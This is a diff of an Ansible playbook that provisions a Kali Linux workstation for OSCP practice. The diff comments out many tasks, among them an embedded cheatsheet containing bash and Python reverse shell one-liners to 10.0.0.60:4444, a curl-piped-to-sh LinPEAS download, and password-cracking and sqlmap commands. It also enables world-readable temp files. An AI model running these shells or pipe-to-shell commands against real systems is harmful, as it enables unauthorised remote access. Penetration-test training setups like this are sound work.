@@ -9,12 +9,14 @@
   vars_files: 
     - ~/vaults/nullsec-ansible.yaml
   vars:
-    username: "{{ ansible_user_id }}"
-    home_dir: "/home/{{ username }}"
+    username: "{{ ansible_facts.user_id }}"
+    home_dir: "~"
     static_ip: "10.0.0.33"
     gateway: "10.0.0.1"
     dns_server: "10.0.0.1"
     interface: "eth0"  # Change this to your interface name (eth0, ens33, etc.)
+    # ansible_common_remote_group: "{{ username }}"
+    allow_world_readable_tmpfiles: true
     
   tasks:
     - name: Update and upgrade all packages
@@ -31,15 +33,13 @@
           - wget
           - git
           - vim
-          - neovim
+          - fastfetch
           - tmux
           - htop
           - btop
           - tree
           - jq
           - mtr
-          - neofetch
-          - fastfetch
           - zsh
           - fonts-powerline
           - fonts-firacode
@@ -56,7 +56,6 @@
           - kali-tools-web
           - kali-tools-exploitation
           - kali-tools-information-gathering
-          - kali-tools-password
           - kali-tools-wireless
           # Additional pentest tools
           - nmap
@@ -87,6 +86,7 @@
           - proxychains4
           # Sync tools
           - syncthing
+          - fzf
         state: present
 
     - name: Install Rust and Cargo
@@ -94,15 +94,15 @@
         curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
       args:
         creates: "{{ home_dir }}/.cargo/bin/cargo"
-      become: no
+      become: yes
 
     - name: Source Rust environment
       lineinfile:
-        path: "{{ home_dir }}/.bashrc"
+        path: "/home/{{ username }}/.bashrc"  # Use actual user
         line: 'source $HOME/.cargo/env'
         create: yes
-      become: no
-
+      become: yes
+    
     - name: Install Rust-based security tools
       shell: |
         source {{ home_dir }}/.cargo/env
@@ -117,29 +117,52 @@
         - exa
         - tokei
         - bandwhich
-      become: no
+      become: yes
       ignore_errors: yes
 
-    - name: Install Python security tools
-      pip:
-        name:
-          - pipx
-          - pwntools
-          - ropper
-          - requests
-          - beautifulsoup4
-          - scapy
-        executable: pip3
+#    - name: Install pipx system-wide (it's in apt)
+#      apt:
+#        name: pipx
+#        state: present
+#      become: yes
+#
+#    - name: Ensure pipx path
+#      command: pipx ensurepath
+#      become_user: username
+#      become: yes
+#
+#    - name: Install Python security tools with pipx
+#      command: pipx install {{ item }}
+#      loop:
+#        - pwntools
+#        - ropper
+#        - scapy
+#      become_user: username
+#      become: yes
+#      vars:
+#        allow_world_readable_tmpfiles: true
+#      ignore_errors: yes
+#
+#    - name: Install library packages in user venv
+#      pip:
+#        name:
+#          - requests
+#          - beautifulsoup4
+#        extra_args: --user
+#      become_user: username
+#      become: yes
+#      vars:
+#        allow_world_readable_tmpfiles: true
+#        
+#    - name: Ensure pipx and cargo are in PATH
+#      lineinfile:
+#        path: "{{ home_dir }}/.bashrc"
+#        line: "{{ item }}"
+#        create: yes
+#      loop:
+#        - 'export PATH="$PATH:{{ home_dir }}/.local/bin"'
+#        - 'export PATH="$PATH:{{ home_dir }}/.cargo/bin"'
 
-    - name: Ensure pipx and cargo are in PATH
-      lineinfile:
-        path: "{{ home_dir }}/.bashrc"
-        line: "{{ item }}"
-        create: yes
-      loop:
-        - 'export PATH="$PATH:{{ home_dir }}/.local/bin"'
-        - 'export PATH="$PATH:{{ home_dir }}/.cargo/bin"'
-      become: no
 
     - name: Install Oh My Zsh
       shell: |
@@ -258,269 +281,269 @@
         - machs/notes
         - .config/syncthing
 
-    - name: Clone useful GitHub repositories
-      git:
-        repo: "{{ item.repo }}"
-        dest: "{{ home_dir }}/machs/tools/{{ item.name }}"
-        version: main
-      become: no
-      loop:
-        - { repo: 'https://github.com/danielmiessler/SecLists.git', name: 'SecLists' }
-        - { repo: 'https://github.com/carlospolop/PEASS-ng.git', name: 'PEASS-ng' }
-        - { repo: 'https://github.com/rebootuser/LinEnum.git', name: 'LinEnum' }
-      ignore_errors: yes
-
-    - name: Configure static IP address
-      copy:
-        dest: "/etc/network/interfaces.d/{{ interface }}"
-        content: |
-          auto {{ interface }}
-          iface {{ interface }} inet static
-              address {{ static_ip }}
-              netmask 255.255.255.0
-              gateway {{ gateway }}
-              dns-nameservers {{ dns_server }}
-        backup: yes
-
+#    - name: Clone useful GitHub repositories
+#      git:
+#        repo: "{{ item.repo }}"
+#        dest: "{{ home_dir }}/machs/tools/{{ item.name }}"
+#        version: main
+#      become: no
+#      loop:
+#        - { repo: 'https://github.com/danielmiessler/SecLists.git', name: 'SecLists' }
+#        - { repo: 'https://github.com/carlospolop/PEASS-ng.git', name: 'PEASS-ng' }
+#        - { repo: 'https://github.com/rebootuser/LinEnum.git', name: 'LinEnum' }
+#      ignore_errors: yes
+#
+#    - name: Configure static IP address
+#      copy:
+#        dest: "/etc/network/interfaces.d/{{ interface }}"
+#        content: |
+#          auto {{ interface }}
+#          iface {{ interface }} inet static
+#              address {{ static_ip }}
+#              netmask 255.255.255.0
+#              gateway {{ gateway }}
+#              dns-nameservers {{ dns_server }}
+#        backup: yes
+#
     - name: Set DNS servers
       copy:
         dest: /etc/resolv.conf
         content: |
           nameserver {{ dns_server }}
-          nameserver 8.8.8.8
-          nameserver 8.8.4.4
+          nameserver 1.1.1.1
+          nameserver 9.9.9.9
         backup: yes
 
-    - name: Generate SSH RSA key pair
-      openssh_keypair:
-        path: "{{ home_dir }}/.ssh/id_rsa"
-        type: rsa
-        size: 4096
-        owner: "{{ username }}"
-        group: "{{ username }}"
-        comment: "{{ username }}@kali-oscp"
-      become: no
+#    - name: Generate SSH RSA key pair
+#      openssh_keypair:
+#        path: "{{ home_dir }}/.ssh/id_rsa"
+#        type: rsa
+#        size: 4096
+#        owner: "{{ username }}"
+#        group: "{{ username }}"
+#        comment: "{{ username }}@kali-oscp"
+#      become: no
 
-    - name: Read SSH public key
-      slurp:
-        src: "{{ home_dir }}/.ssh/id_rsa.pub"
-      register: ssh_public_key
-      become: no
+#    - name: Read SSH public key
+#      slurp:
+#        src: "{{ home_dir }}/.ssh/id_rsa.pub"
+#      register: ssh_public_key
+#      become: no
 
-    - name: Configure tmux
-      copy:
-        dest: "{{ home_dir }}/.tmux.conf"
-        owner: "{{ username }}"
-        content: |
-          # Tmux configuration for pentest workflow
-          set -g mouse on
-          set -g history-limit 10000
-          set -g base-index 1
-          setw -g pane-base-index 1
-          
-          # Easy config reload
-          bind-key r source-file ~/.tmux.conf \; display-message "Config reloaded"
-          
-          # Better split commands
-          bind | split-window -h
-          bind - split-window -v
-          
-          # Status bar
-          set -g status-style bg=black,fg=white
-          set -g status-left '#[fg=green][#S] '
-          set -g status-right '#[fg=yellow]%Y-%m-%d %H:%M'
-
-    - name: Configure Neovim
-      copy:
-        dest: "{{ home_dir }}/.config/nvim/init.vim"
-        owner: "{{ username }}"
-        content: |
-          syntax on
-          set number
-          set relativenumber
-          set tabstop=4
-          set shiftwidth=4
-          set expandtab
-          set autoindent
-          set mouse=a
-          set clipboard=unnamedplus
-          set termguicolors
-          
-          " Enable file type detection
-          filetype plugin indent on
-      become: no
-
-    - name: Ensure .config/nvim directory exists
-      file:
-        path: "{{ home_dir }}/.config/nvim"
-        state: directory
-        owner: "{{ username }}"
-        group: "{{ username }}"
-      become: no
-
-    - name: Configure proxychains
-      lineinfile:
-        path: /etc/proxychains4.conf
-        regexp: '^socks4'
-        line: 'socks5 127.0.0.1 9050'
-        backup: yes
-
-    - name: Enable and start PostgreSQL for Metasploit
-      systemd:
-        name: postgresql
-        enabled: yes
-        state: started
-
-    - name: Initialize Metasploit database
-      shell: msfdb init
-      args:
-        creates: /usr/share/metasploit-framework/config/database.yml
-      ignore_errors: yes
-
-    - name: Enable and start Syncthing
-      systemd:
-        name: syncthing@{{ username }}
-        enabled: yes
-        state: started
-
-    - name: Update locate database
-      command: updatedb
-      async: 300
-      poll: 0
-
-    - name: Create OSCP quick reference cheatsheet
-      copy:
-        dest: "{{ home_dir }}/machs/OSCP-CHEATSHEET.md"
-        owner: "{{ username }}"
-        content: |
-          # OSCP Quick Reference Cheatsheet
-          
-          ## Rust Tools
-          ```bash
-          # RustScan - Fast port scanner
-          rustscan -a target.com -- -A -sC
-          
-          # ripgrep - Better grep
-          rg "pattern" /path
-          
-          # fd - Better find
-          fd filename
-          
-          # bat - Better cat with syntax highlighting
-          bat file.txt
-          
-          # exa - Better ls
-          exa -lah --icons
-          ```
-          
-          ## Network Scanning
-          ```bash
-          # RustScan + Nmap combo
-          rustscan -a 10.0.0.1-254 --ulimit 5000 -- -A -sC -sV
-          
-          # Quick nmap scan
-          nmap -sV -sC -oA scan target.com
-          
-          # Full port scan
-          nmap -p- -oA fullscan target.com
-          
-          # UDP scan
-          nmap -sU -oA udpscan target.com
-          
-          # Network trace
-          mtr target.com
-          ```
-          
-          ## Web Enumeration
-          ```bash
-          # Directory bruteforce
-          gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
-          
-          # Subdomain enumeration
-          gobuster dns -d target.com -w ~/machs/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
-          
-          # Nikto scan
-          nikto -h http://target.com
-          ```
-          
-          ## Exploitation
-          ```bash
-          # Start Metasploit
-          msfconsole
-          
-          # Search for exploits
-          searchsploit apache 2.4
-          
-          # SQLi testing
-          sqlmap -u "http://target.com/page?id=1" --batch --dbs
-          ```
-          
-          ## Password Attacks
-          ```bash
-          # Hydra SSH
-          hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com
-          
-          # John the Ripper
-          john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-          
-          # Hashcat
-          hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-          ```
-          
-          ## File Transfers
-          ```bash
-          # Start HTTP server
-          python3 -m http.server 8000
-          
-          # Download from target
-          wget http://10.0.0.60:8000/file
-          curl http://10.0.0.60:8000/file -o file
-          
-          # SMB server
-          impacket-smbserver share . -smb2support
-          ```
-          
-          ## Privilege Escalation
-          ```bash
-          # LinPEAS
-          curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-          
-          # Local file for enum
-          ~/machs/tools/LinEnum/LinEnum.sh
-          
-          # Check sudo
-          sudo -l
-          
-          # SUID binaries
-          find / -perm -4000 -type f 2>/dev/null
-          ```
-          
-          ## Reverse Shells
-          ```bash
-          # Listener
-          nc -lvnp 4444
-          
-          # Bash
-          bash -i >& /dev/tcp/10.0.0.60/4444 0>&1
-          
-          # Python
-          python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.60",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
-          ```
-          
-          ## Syncthing
-          ```bash
-          # Access web UI (default)
-          http://127.0.0.1:8384
-          
-          # Configure sync folders for machs directory
-          ```
-          
-          ## CherryTree Notes
-          ```bash
-          # Launch
-          cherrytree ~/machs/notes/oscp-notes.ctb
-          ```
-
+#    - name: Configure tmux
+#      copy:
+#        dest: "{{ home_dir }}/.tmux.conf"
+#        owner: "{{ username }}"
+#        content: |
+#          # Tmux configuration for pentest workflow
+#          set -g mouse on
+#          set -g history-limit 10000
+#          set -g base-index 1
+#          setw -g pane-base-index 1
+#          
+#          # Easy config reload
+#          bind-key r source-file ~/.tmux.conf \; display-message "Config reloaded"
+#          
+#          # Better split commands
+#          bind | split-window -h
+#          bind - split-window -v
+#          
+#          # Status bar
+#          set -g status-style bg=black,fg=white
+#          set -g status-left '#[fg=green][#S] '
+#          set -g status-right '#[fg=yellow]%Y-%m-%d %H:%M'
+#
+#    - name: Configure Neovim
+#      copy:
+#        dest: "{{ home_dir }}/.config/nvim/init.vim"
+#        owner: "{{ username }}"
+#        content: |
+#          syntax on
+#          set number
+#          set relativenumber
+#          set tabstop=4
+#          set shiftwidth=4
+#          set expandtab
+#          set autoindent
+#          set mouse=a
+#          set clipboard=unnamedplus
+#          set termguicolors
+#          
+#          " Enable file type detection
+#          filetype plugin indent on
+#      become: no
+#
+#    - name: Ensure .config/nvim directory exists
+#      file:
+#        path: "{{ home_dir }}/.config/nvim"
+#        state: directory
+#        owner: "{{ username }}"
+#        group: "{{ username }}"
+#      become: no
+#
+#    - name: Configure proxychains
+#      lineinfile:
+#        path: /etc/proxychains4.conf
+#        regexp: '^socks4'
+#        line: 'socks5 127.0.0.1 9050'
+#        backup: yes
+#
+#    - name: Enable and start PostgreSQL for Metasploit
+#      systemd:
+#        name: postgresql
+#        enabled: yes
+#        state: started
+#
+#    - name: Initialize Metasploit database
+#      shell: msfdb init
+#      args:
+#        creates: /usr/share/metasploit-framework/config/database.yml
+#      ignore_errors: yes
+#
+#    - name: Enable and start Syncthing
+#      systemd:
+#        name: syncthing@{{ username }}
+#        enabled: yes
+#        state: started
+#
+#    - name: Update locate database
+#      command: updatedb
+#      async: 300
+#      poll: 0
+#
+#    - name: Create OSCP quick reference cheatsheet
+#      copy:
+#        dest: "{{ home_dir }}/machs/OSCP-CHEATSHEET.md"
+#        owner: "{{ username }}"
+#        content: |
+#          # OSCP Quick Reference Cheatsheet
+#          
+#          ## Rust Tools
+#          ```bash
+#          # RustScan - Fast port scanner
+#          rustscan -a target.com -- -A -sC
+#          
+#          # ripgrep - Better grep
+#          rg "pattern" /path
+#          
+#          # fd - Better find
+#          fd filename
+#          
+#          # bat - Better cat with syntax highlighting
+#          bat file.txt
+#          
+#          # exa - Better ls
+#          exa -lah --icons
+#          ```
+#          
+#          ## Network Scanning
+#          ```bash
+#          # RustScan + Nmap combo
+#          rustscan -a 10.0.0.1-254 --ulimit 5000 -- -A -sC -sV
+#          
+#          # Quick nmap scan
+#          nmap -sV -sC -oA scan target.com
+#          
+#          # Full port scan
+#          nmap -p- -oA fullscan target.com
+#          
+#          # UDP scan
+#          nmap -sU -oA udpscan target.com
+#          
+#          # Network trace
+#          mtr target.com
+#          ```
+#          
+#          ## Web Enumeration
+#          ```bash
+#          # Directory bruteforce
+#          gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+#          
+#          # Subdomain enumeration
+#          gobuster dns -d target.com -w ~/machs/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+#          
+#          # Nikto scan
+#          nikto -h http://target.com
+#          ```
+#          
+#          ## Exploitation
+#          ```bash
+#          # Start Metasploit
+#          msfconsole
+#          
+#          # Search for exploits
+#          searchsploit apache 2.4
+#          
+#          # SQLi testing
+#          sqlmap -u "http://target.com/page?id=1" --batch --dbs
+#          ```
+#          
+#          ## Password Attacks
+#          ```bash
+#          # Hydra SSH
+#          hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com
+#          
+#          # John the Ripper
+#          john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+#          
+#          # Hashcat
+#          hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+#          ```
+#          
+#          ## File Transfers
+#          ```bash
+#          # Start HTTP server
+#          python3 -m http.server 8000
+#          
+#          # Download from target
+#          wget http://10.0.0.60:8000/file
+#          curl http://10.0.0.60:8000/file -o file
+#          
+#          # SMB server
+#          impacket-smbserver share . -smb2support
+#          ```
+#          
+#          ## Privilege Escalation
+#          ```bash
+#          # LinPEAS
+#          curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+#          
+#          # Local file for enum
+#          ~/machs/tools/LinEnum/LinEnum.sh
+#          
+#          # Check sudo
+#          sudo -l
+#          
+#          # SUID binaries
+#          find / -perm -4000 -type f 2>/dev/null
+#          ```
+#          
+#          ## Reverse Shells
+#          ```bash
+#          # Listener
+#          nc -lvnp 4444
+#          
+#          # Bash
+#          bash -i >& /dev/tcp/10.0.0.60/4444 0>&1
+#          
+#          # Python
+#          python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.60",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+#          ```
+#          
+#          ## Syncthing
+#          ```bash
+#          # Access web UI (default)
+#          http://127.0.0.1:8384
+#          
+#          # Configure sync folders for machs directory
+#          ```
+#          
+#          ## CherryTree Notes
+#          ```bash
+#          # Launch
+#          cherrytree ~/machs/notes/oscp-notes.ctb
+#          ```
+#
     - name: Display completion message with SSH key
       debug:
         msg:
@@ -532,16 +555,16 @@
           - "DNS: {{ dns_server }}"
           - ""
           - "Workspace created at: {{ home_dir }}/machs"
-          - "Cheatsheet: {{ home_dir }}/machs/OSCP-CHEATSHEET.md"
+#          - "Cheatsheet: {{ home_dir }}/machs/OSCP-CHEATSHEET.md"
           - ""
           - "Installed Rust tools:"
           - "  - rustscan (fast port scanner)"
           - "  - ripgrep, fd, bat, exa, tokei, bandwhich"
           - ""
-          - "SSH RSA Key Generated:"
-          - "{{ ssh_public_key.content | b64decode }}"
+#          - "SSH RSA Key Generated:"
+#          - "{{ ssh_public_key.content | b64decode }}"
           - ""
-          - "Syncthing Web UI: http://127.0.0.1:8384"
+#          - "Syncthing Web UI: http://127.0.0.1:8384"
           - ""
           - "Next steps:"
           - "1. Reboot to apply network settings"
